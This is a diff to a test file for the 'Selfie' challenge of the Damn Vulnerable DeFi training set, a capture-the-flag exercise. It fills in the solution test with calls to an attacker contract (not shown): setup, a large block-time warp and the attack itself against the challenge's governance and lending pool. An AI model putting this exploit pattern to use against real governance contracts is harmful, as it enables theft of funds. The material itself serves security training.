@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import "./Attacker.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(token, governance, pool, recovery);
+        attacker.preload();
+        vm.warp(block.timestamp + 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+        attacker.attack();
     }
 
     /**
